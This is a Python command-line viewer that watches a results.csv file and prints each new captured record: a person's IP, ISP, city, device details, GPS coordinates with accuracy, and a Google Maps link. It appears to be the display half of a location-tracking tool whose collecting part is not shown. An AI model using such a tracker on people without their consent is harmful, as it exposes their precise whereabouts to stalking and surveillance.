# analyzer.py

import csv
import time
import os
import requests
from colorama import Fore, Style, init

init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    print(Fore.CYAN + Style.BRIGHT + """
    ┌───────────────────────────────────────┐
    │   Geolocation Info Tracker (CLI UI)  │
    └───────────────────────────────────────┘
    """)

def get_info():
    with open("results.csv", "r") as file:
        reader = csv.DictReader(file)
        rows = list(reader)

    if not rows:
        print(Fore.RED + "No data yet.")
        return

    last = rows[-1]

    print(Fore.YELLOW + "[!] Device Information :")
    print(Fore.GREEN + f"    Screen     : {last.get('screen')}")
    print(Fore.GREEN + f"    UserAgent  : {last.get('userAgent')}")
    
    print(Fore.YELLOW + "\n[!] IP & Location Info :")
    print(Fore.GREEN + f"    IP         : {last.get('ip')}")
    print(Fore.GREEN + f"    City       : {last.get('city')}")
    print(Fore.GREEN + f"    Region     : {last.get('region')}")
    print(Fore.GREEN + f"    Country    : {last.get('country')}")
    print(Fore.GREEN + f"    ISP        : {last.get('isp')}")
    print(Fore.GREEN + f"    Accuracy   : {last.get('accuracy')} meters")
    print(Fore.GREEN + f"    Latitude   : {last.get('latitude')}")
    print(Fore.GREEN + f"    Longitude  : {last.get('longitude')}")
    
    print(Fore.YELLOW + "\n[!] Google Maps Link :")
    print(Fore.CYAN + f"    https://www.google.com/maps?q={last.get('latitude')},{last.get('longitude')}")

if __name__ == "__main__":
    clear()
    display_banner()
    print(Fore.BLUE + "[*] Waiting for data...\n")
    last_count = 0
    while True:
        try:
            with open("results.csv") as f:
                count = sum(1 for line in f)
                if count != last_count:
                    clear()
                    display_banner()
                    get_info()
                    last_count = count
            time.sleep(2)
        except KeyboardInterrupt:
            print(Fore.RED + "\n[!] Exiting...")
            break
